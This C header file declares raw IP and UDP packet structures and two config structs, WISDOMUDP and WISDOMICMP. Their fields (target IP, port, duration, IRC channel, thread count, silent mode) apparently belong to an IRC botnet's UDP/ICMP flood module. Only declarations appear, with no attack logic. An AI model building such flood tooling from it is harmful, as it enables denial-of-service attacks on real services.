#ifndef NO_WISDOM
#define SYN 0x02 
#define ACK 0x10
#define IP_HDRINCL 2
#define REQ_DATASIZE 1024

typedef struct udphdrx
{
    unsigned short sport;	
    unsigned short dport;
    unsigned short Length; 	 
    unsigned short Checksum;
}UDPHDRX;

typedef struct ip_hdrx 
{ 
	unsigned char h_verlen; 
	unsigned char tos; 
	unsigned short total_len; 
	unsigned short ident; 
	unsigned short frag_and_flags; 
	unsigned char ttl; 
	unsigned char proto; 
	unsigned short checksum; 
	unsigned int sourceIP; 
	unsigned int destIP; 
}IPHEADERX; 

typedef struct UDPPACKET
{
	IPHEADERX ipHeader;
    UDPHDRX udpHeader;
    char cData[REQ_DATASIZE];
}UDPPACKET;

typedef struct WISDOMUDP {

	SOCKET sock;
	char ip[128];
	char port[128];
	char time[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
} WISDOMUDP;

typedef struct WISDOMICMP {
	SOCKET sock;
	char ip[128];
	char time[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
} WISDOMICMP;

DWORD WINAPI WisdomUDPThread(LPVOID param);
int WisdomUDP(WISDOMUDP info);
#endif